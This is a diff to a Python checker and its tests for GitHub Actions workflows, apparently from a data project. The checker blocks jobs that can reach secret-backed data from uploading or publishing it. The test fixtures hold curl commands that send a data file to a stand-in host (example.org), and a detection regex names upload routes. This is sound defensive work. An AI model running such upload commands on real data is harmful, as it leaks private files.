@@ -9,16 +9,19 @@ public.
 What the check does:
 
 - A job **can reach the data** when it, or its workflow, mentions
-  ``secrets`` in any form other than ``secrets.GITHUB_TOKEN`` (presumed a
-  data credential whatever it is called), passes secrets on, can request an
-  OIDC token (``id-token: write``), signs in to Google Cloud, or downloads
-  artifacts.
+  ``secrets`` in any form or case other than ``secrets.GITHUB_TOKEN``
+  (presumed a data credential whatever it is called; expressions are
+  case-insensitive), passes secrets on, can request an OIDC token
+  (``id-token: write`` or ``write-all``), signs in to Google Cloud, or
+  downloads artifacts.
 - In such a job, every action must be reviewed for the inputs it is given
   (``REVIEWED_ACTIONS``), so a set-up action can't be pointed at the
-  workspace, and setup-uv must not save its cache (``save-cache: false``). Every artifact upload must name literal files reviewed for that
-  job in ``REVIEWED``: no directories, globs, exclusions or expressions.
-  Every run line that matches ``PUBLISH_COMMAND`` must be, in full, a command
-  reviewed for that job.
+  workspace, and setup-uv must not save its cache (``save-cache: false``).
+  Every artifact upload must name literal files reviewed for that job in
+  ``REVIEWED``: no directories, globs, exclusions or expressions. Every run
+  line that matches ``PUBLISH_COMMAND`` must be, in full, a command reviewed
+  for that job. A job that commits its whole workspace may run only its
+  reviewed lines (``runs_only``).
 - Jobs that can't reach the data (docs, changelog) may publish.
 
 What it does not do (Sol re-review of #603): it recognises reviewed workflow
@@ -45,15 +48,11 @@ WORKFLOW_DIR = Path(__file__).parents[2] / ".github" / "workflows"
 WORKFLOWS = sorted(WORKFLOW_DIR.glob("*.y*ml"))
 
 # Any mention of secrets but this one is presumed to reach the data, in any
-# syntax: secrets.NAME, secrets['NAME'], toJSON(secrets) (Sol re-review 2 of
-# #603).
-NON_DATA_SECRET = "secrets.GITHUB_TOKEN"
+# syntax or case: secrets.NAME, SECRETS.NAME, secrets['NAME'],
+# toJSON(secrets) (Sol re-reviews 2 and 3 of #603).
+_NON_DATA_SECRET = re.compile(r"\bsecrets\.github_token\b", re.IGNORECASE)
+_SECRETS = re.compile(r"\bsecrets\b", re.IGNORECASE)
 DATA_ACTIONS = ("google-github-actions/auth",)
-# Commands that fetch or build the data, which a job publishing its whole
-# workspace must not run.
-DATA_COMMAND = re.compile(
-    r"make (download|data)\b|huggingface|hf_hub|policyengine_uk_data/storage"
-)
 
 # Actions that publish nothing when given only these inputs. setup-uv's
 # cache is on by default on hosted runners and its location can be moved
@@ -95,24 +94,29 @@ REVIEWED = {
         "artifacts": {},
         "commands": (),
         # Commits the version bump. Its secrets are the GitHub app's. It
-        # commits the whole workspace, so it must fetch and build no data
-        # (checked: no run line matches DATA_COMMAND).
+        # commits the whole workspace, so it may run only these lines and
+        # can't fetch or build data (Sol re-review 3 of #603: a bare `make`
+        # builds the data, so command names aren't enough).
         "actions": {
             "EndBug/add-and-commit": {"add": ".", "message": "Update package version"}
         },
-        "no_data_commands": True,
+        "runs_only": (
+            "pip install towncrier",
+            "python .github/bump_version.py",
+            "towncrier build --yes --version $(python -c \"import re; print(re.search(r'version = \\\"(.+?)\\\"', open('pyproject.toml').read()).group(1))\")",
+        ),
     },
 }
 
 PUBLISH_COMMAND = re.compile(
     r"make upload|publish-git-tag|\bgh\s+[a-z]"  # any gh command
     r"|\bgit push\b"
-    r"|\bcurl\b.*(--upload-file|--form|--json|--data|--request\s+(POST|PUT|PATCH)"
-    r"|-X\s*(POST|PUT|PATCH)|\s-[A-Za-z]*[TFd][A-Za-z]*\b)"
+    r"|\bcurl\b.*(--upload-file|--form|--json|--data|--config"
+    r"|--request\s+(POST|PUT|PATCH)|-X\s*(POST|PUT|PATCH)|\s-[^\s-]*[TFdK])"
     r"|\baws s3\b|\bgsutil\b|\bgcloud\b|huggingface-cli|\bhf upload\b|\btwine\b"
 )
 _NOT_LITERAL = re.compile(r"[*?\[\]{}!]|\$\{\{")
-_EMPTY = {"artifacts": {}, "commands": (), "actions": {}, "no_data_commands": False}
+_EMPTY = {"artifacts": {}, "commands": (), "actions": {}, "runs_only": None}
 
 
 def _jobs(workflow: dict) -> dict:
@@ -126,11 +130,13 @@ def _triggers(workflow: dict) -> dict:
 
 
 def _uses_data_secret(text: str) -> bool:
-    return bool(re.search(r"\bsecrets\b", text.replace(NON_DATA_SECRET, "")))
+    return bool(_SECRETS.search(_NON_DATA_SECRET.sub("", text)))
 
 
 def _requests_oidc(block) -> bool:
     permissions = (block or {}).get("permissions")
+    if isinstance(permissions, str):
+        return permissions.strip().lower() == "write-all"
     return (
         isinstance(permissions, dict)
         and str(permissions.get("id-token", "")).strip('"') == "write"
@@ -243,11 +249,13 @@ def problems(name: str, workflow: dict) -> list:
                 else:
                     out.append(f"{where} uses an unreviewed action: {uses}")
             script = str(step.get("run", ""))
-            if reviewed["no_data_commands"] and DATA_COMMAND.search(script):
-                out.append(
-                    f"{where} publishes its workspace, so it must not fetch or "
-                    "build the data"
-                )
+            if reviewed["runs_only"] is not None:
+                for line in logical_lines(script):
+                    if line not in reviewed["runs_only"]:
+                        out.append(
+                            f"{where} publishes its workspace, so it may run only "
+                            f"its reviewed lines, not {line!r}"
+                        )
             for line in logical_lines(script):
                 if PUBLISH_COMMAND.search(line) and line not in reviewed["commands"]:
                     out.append(
@@ -352,6 +360,10 @@ def test_an_unreviewed_upload_from_a_data_job_fails(path):
         {"run": "curl -sT la_calibration_log.csv https://example.org/"},
         {"run": "curl --form f=@la_calibration_log.csv https://example.org/"},
         {"run": "curl --json @la_calibration_log.csv https://example.org/"},
+        {"run": "curl -#T la_calibration_log.csv https://example.org/"},
+        {"run": "curl -4T la_calibration_log.csv https://example.org/"},
+        {"run": "curl -K upload.cfg https://example.org/"},
+        {"run": "curl --config upload.cfg https://example.org/"},
     ],
 )
 def test_other_routes_out_of_a_data_job_fail(step):
@@ -424,7 +436,10 @@ def test_a_workflow_level_credential_makes_every_job_a_data_job():
         {"env": {"GH_TOKEN": "${{ secrets.ANY_NAME }}"}, "steps": []},
         {"env": {"HF": "${{ secrets['HUGGING_FACE_TOKEN'] }}"}, "steps": []},
         {"env": {"ALL": "${{ toJSON(secrets) }}"}, "steps": []},
+        {"env": {"HF": "${{ SECRETS.HUGGING_FACE_TOKEN }}"}, "steps": []},
+        {"env": {"HF": "${{ Secrets['X'] }}"}, "steps": []},
         {"permissions": {"id-token": "write"}, "steps": []},
+        {"permissions": "write-all", "steps": []},
         {"uses": "org/repo/.github/workflows/build.yaml@main", "secrets": "inherit"},
         {"steps": [{"uses": "google-github-actions/auth@v3"}]},
         {"steps": [{"uses": "actions/download-artifact@v8"}]},
@@ -440,6 +455,9 @@ def test_a_job_with_only_the_github_token_is_not_a_data_job():
     assert not reaches_data(job)
     job = {"env": {"GH_TOKEN": "${{ secrets.GITHUB_TOKEN }}"}, "steps": []}
     assert not reaches_data(job)
+    job = {"env": {"GH_TOKEN": "${{ SECRETS.github_token }}"}, "steps": []}
+    assert not reaches_data(job)
+    assert not reaches_data({"permissions": "read-all", "steps": []})
 
 
 def test_a_reusable_workflow_in_a_data_job_fails():
@@ -511,10 +529,19 @@ def test_a_workflow_level_oidc_permission_makes_a_data_job():
     assert reaches_data(workflow["jobs"]["a"], workflow)
 
 
-def test_the_versioning_commit_may_not_follow_a_data_build():
-    """Sol re-review 2 of #603, finding 3: it commits the whole workspace."""
+@pytest.mark.parametrize(
+    "line",
+    [
+        "uv run make data",
+        "uv run make",
+        "make all",
+        "python policyengine_uk_data/datasets/create_datasets.py",
+        "echo hi",
+    ],
+)
+def test_the_versioning_commit_job_runs_only_its_reviewed_lines(line):
+    """Sol re-reviews 2 and 3 of #603: it commits the whole workspace, and a
+    bare `make` builds the data, so only its reviewed lines may run."""
     data = copy.deepcopy(_load(WORKFLOW_DIR / "versioning.yaml"))
-    _jobs(data)["Versioning"]["steps"].insert(1, {"run": "uv run make data"})
-    assert any(
-        "must not fetch or build" in p for p in problems("versioning.yaml", data)
-    )
+    _jobs(data)["Versioning"]["steps"].insert(1, {"run": line})
+    assert any("reviewed lines" in p for p in problems("versioning.yaml", data))
